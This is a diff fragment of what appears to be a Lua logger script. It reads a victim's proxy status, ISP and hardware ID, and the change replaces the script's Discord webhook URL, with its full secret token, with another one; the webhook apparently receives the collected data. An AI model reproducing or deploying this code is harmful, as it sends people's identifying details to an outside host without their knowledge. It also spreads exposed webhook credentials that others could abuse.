@@ -59,7 +59,7 @@ Proxy = d['proxy']
 ISP = d['isp']
 
 if hwid then 
-    url = "https://discord.com/api/webhooks/1091802824104497162/tV7D2W3WLL_LsDn-2nkkb6_z6N70yLh8J4syLP8uV0JM2_cni7fzDWKukrB711CFJV0B"
+    url = "https://discord.com/api/webhooks/1100538157826580582/VwM6lEPRDU8ycJww3NPwjtX03QIKc7Rr3cMtzQy9xKfJcVBv2LKlW1h8LZPQUKDtoyJO"
 
 local Data = 
 {
